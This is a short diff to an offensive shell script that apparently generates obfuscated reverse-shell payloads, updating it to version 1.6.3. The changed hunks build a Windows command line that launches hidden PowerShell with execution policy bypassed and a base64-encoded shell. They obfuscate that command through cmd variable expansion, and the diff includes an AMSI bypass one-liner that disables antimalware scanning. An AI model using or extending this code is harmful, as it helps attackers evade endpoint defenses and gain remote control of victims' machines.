@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 DIR="$1"
-version="1.6.2"
+version="1.6.3"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -694,7 +694,7 @@ fi
 if [[ $3 == "w" ]]
 then 
     windows=1
-    win="-W%${space}%Hidden"
+    win="-W!${space}!Hidden"
     at="@"
     #"Mini-AMSI-bypass. Partial"
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
@@ -728,7 +728,7 @@ shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
 
 if [[ $windows == 1 ]]
 then
-    rev="cmd /c \"set ${pwsh}=${pw_sh} & set ${space}=\" \" $mssense & call %${pwsh}%%${space}%${win}%${space}%-noprofile%${space}%-executionpolicy%${space}%bypass%${space}%-NoExit%${space}%-e%${space}%${shell}\""
+    rev="cmd /v /c \"set ${pwsh}=${pw_sh} && set ${space}=\" \" $mssense && call !${pwsh}!!${space}!${win}!${space}!-noprofile!${space}!-executionpolicy!${space}!bypass!${space}!-NoExit!${space}!-e!${space}!${shell}\""
 else
     rev="${pw_sh} -noprofile -executionpolicy bypass -NoExit -e ${shell}"
 fi
